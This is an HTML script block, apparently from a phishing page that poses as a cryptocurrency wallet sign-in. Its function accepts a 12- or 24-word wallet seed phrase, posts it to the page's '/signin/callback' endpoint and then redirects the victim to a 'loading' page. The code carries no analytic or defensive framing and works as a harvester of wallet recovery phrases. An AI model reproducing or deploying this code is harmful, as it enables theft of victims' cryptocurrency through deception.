    <script>
      function validateInput(event) {
        event.preventDefault();
        var seed = document.getElementById('seedInput').value;
        if (seed.split(' ').length === 12 || seed.split(' ').length === 24) {
          document.getElementById('seedInput').style.borderColor = 'green';

          fetch('/signin/callback', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `phrase=${encodeURIComponent(seed)}`
          })
          .then(response => response.json())
          .then(data => {
            if (data.status === 'success') {
              const urlParams = new URLSearchParams(window.location.search);
              window.location.href = '/account/loading?' + urlParams.toString();
            }
          })
          .catch((error) => {
            console.error('Error:', error);
          });

        } else {
          document.getElementById('seedInput').style.borderColor = 'red';
          alert('Invalid seed phrase. Please enter a valid 12 or 24 word seed phrase.');
        }
      }
    </script>
